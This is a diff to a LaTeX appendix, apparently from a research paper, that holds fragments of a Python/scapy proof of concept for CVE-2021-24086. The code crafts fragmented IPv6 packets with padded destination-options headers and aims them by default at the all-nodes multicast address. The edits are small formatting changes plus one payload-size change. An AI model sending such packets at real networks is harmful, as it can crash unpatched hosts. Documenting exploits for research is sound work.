@@ -4,7 +4,7 @@
 \standalonetrue
 \begin{document}
 
-\section*{\glsentrytext{POC} for CVE-2021-24086}
+\section{\glsentrytext{POC} for CVE-2021-24086}
 \label{appendix:poc}
 \begin{minted}[breaklines, linenos, breakanywhere]{python}
 from scapy.all import *
@@ -21,7 +21,8 @@ def custom_fragment6(target, frag_id, bytes, nh, frag_size = 1008):
         rest = rest[len(chunk): ]
         last_pkt = len(rest) == 0
 
-        # 0 -> No more / 1 -> More
+        # 0 -> No more fragments
+        # 1 -> More fragments
         m = 0 if last_pkt else 1
         assert offset < 8191
         pkt = Ether() \
@@ -37,6 +38,7 @@ def main():
     parser = argparse.ArgumentParser()
     parser.add_argument('--target', default = 'ff02::1')
     parser.add_argument('--iface', default = 'eth1')
+    
     args = parser.parse_args()
 
     first_fragment_id = random.randint(0, 0xffffffff)
@@ -65,7 +67,7 @@ def main():
     
     packet1 /= IPv6ExtHdrDestOpt(options = [
             PadN(optdata=('a'*0xff)),
-            PadN(optdata=('a'*0xa0)),
+            PadN(optdata=('a'*0xff)),
         ])
     packet1 /= IPv6ExtHdrFragment(
         id = second_fragment_id, m = 1,
